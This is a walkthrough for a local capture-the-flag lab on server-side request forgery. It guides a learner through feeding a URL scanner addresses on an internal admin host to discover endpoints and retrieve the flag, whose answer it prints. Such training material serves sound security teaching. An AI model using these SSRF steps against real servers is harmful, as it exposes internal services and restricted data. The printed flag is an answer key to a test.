# Challenge 3 — SSRF & Internal Service Discovery

## What You Will Learn

SSRF means **Server-Side Request Forgery**.

Simple explanation:
- You send a URL to an application.
- The server fetches that URL for you.
- If controls are weak, the server may reach internal-only endpoints.

In this challenge, you will use a URL scanner to access:

```text
internal-admin.internal.lab
```

and retrieve the challenge flag.

## Before You Start

1. Ensure lab is running on `http://localhost:3005`.
2. Keep the dev server terminal open.
3. Open browser.

WARNING:
The **Service URL** field expects a URL.

Do NOT enter the flag into **Service URL**.

Use the separate **Flag** field under **Flag submission** for the flag.

## Step 1 — Open the Challenge Page

1. Open your browser.
2. Go to:

```text
http://localhost:3005/challenges/ssrf-internal-service-discovery
```

What You Should See:
- Title **SSRF & Internal Service Discovery**.
- **Open target** button.
- **Reset lab** button.
- Evidence panel.

## Step 2 — Open the URL Inspection Service

1. Click **Open target**.

Direct URL (same page):

```text
http://localhost:3005/targets/scanner
```

What You Should See:
- Header **URL Inspection Service**.
- Input label **Service URL**.
- Button **Scan URL**.
- Right panel section **Flag submission**.
- Flag input label **Flag**.
- Button **Submit Flag**.

## Step 3 — Test Invalid URL Handling

1. Click inside **Service URL**.
2. Remove existing text.
3. Enter:

```text
not-a-url
```

4. Click **Scan URL**.

What You Should See:
- Status message near the form:

```text
Scan returned an error response. Review status and payload.
```

- In **Scan result** JSON panel:

```json
{"status":400,"error":"invalid url"}
```

## Step 4 — Test Blocked External Destination

1. In **Service URL**, enter:

```text
http://example.com/
```

2. Click **Scan URL**.

What You Should See:
- JSON shows external destination is blocked:

```json
{"status":403,"error":"destination is outside the inspection network"}
```

## Step 5 — Query the Internal Status Endpoint

1. In **Service URL**, enter:

```text
http://internal-admin.internal.lab/api/status
```

2. Click **Scan URL**.

What You Should See:
- Status message:

```text
Scan completed successfully.
```

- JSON contains:
	- `upstreamStatus: 200`
	- `service: internal-admin`
	- `hostname: internal-admin.internal.lab`

## Step 6 — Discover the Hint Endpoint

1. In **Service URL**, enter:

```text
http://internal-admin.internal.lab/api/notes
```

2. Click **Scan URL**.

What You Should See:
- JSON includes `notes` with a hint mentioning `/api/flag`.

## Step 7 — Retrieve the Flag

1. In **Service URL**, enter:

```text
http://internal-admin.internal.lab/api/flag
```

2. Click **Scan URL**.

What You Should See:
- JSON includes:

```text
CYBERLAB{ssrf_internal_network}
```

IMPORTANT:
Copy the flag value exactly.

## Step 8 — Submit the Flag Correctly

1. In the right panel, locate **Flag submission**.
2. Click inside the **Flag** input field.
3. Enter:

```text
CYBERLAB{ssrf_internal_network}
```

4. Click **Submit Flag**.

What You Should See on target page:
- Message:

```text
Flag accepted. Challenge complete.
```

## Step 9 — Verify Completion on Challenge Page

1. Return to:

```text
http://localhost:3005/challenges/ssrf-internal-service-discovery
```

2. Confirm:
	 - Evidence count is `6/6`.
	 - `Retrieve restricted information` is complete.
	 - `Submit flag` is complete.

## How to Reset the Challenge

1. On the challenge page, click **Reset lab**.

What You Should See:

```text
Lab reset. Start a fresh SSRF investigation.
```

Evidence should return to incomplete.

## Verified API Endpoints (Reference)

- Scan: `POST /api/scanner/api/scan`
- Progress: `GET /api/scanner/api/progress`
- Submit: `POST /api/scanner/submit`
- Reset: `POST /api/scanner/reset`

Internal endpoints (scanner reaches these server-side):
- `GET /api/internal-admin/api/status`
- `GET /api/internal-admin/api/notes`
- `GET /api/internal-admin/api/flag`

## Troubleshooting

### Problem: You pasted flag into Service URL

Fix:
1. Clear **Service URL**.
2. Put only URLs in **Service URL**.
3. Put flag in **Flag** field under **Flag submission**.

### Problem: `invalid url`

Cause:
- Missing `http://` or malformed URL.

Fix:
Use full URL format, for example:

```text
http://internal-admin.internal.lab/api/status
```

### Problem: `destination is outside the inspection network`

Cause:
- Hostname is not allowed.

Fix:
Use `internal-admin.internal.lab` with one of the verified paths.

### Problem: Flag submission rejected

Cause:
- Wrong flag text or flag not retrieved first.

Fix:
1. Re-run Step 7 to retrieve `/api/flag`.
2. Submit exact value:

```text
CYBERLAB{ssrf_internal_network}
```

3. If still failing, click **Reset lab** and repeat Steps 5–8.

## Challenge Complete

You are done when all are true:

- Target page shows **Flag accepted. Challenge complete.**
- Challenge page evidence reaches `6/6`.
- Both `retrieved` and `submitted` objectives are complete.
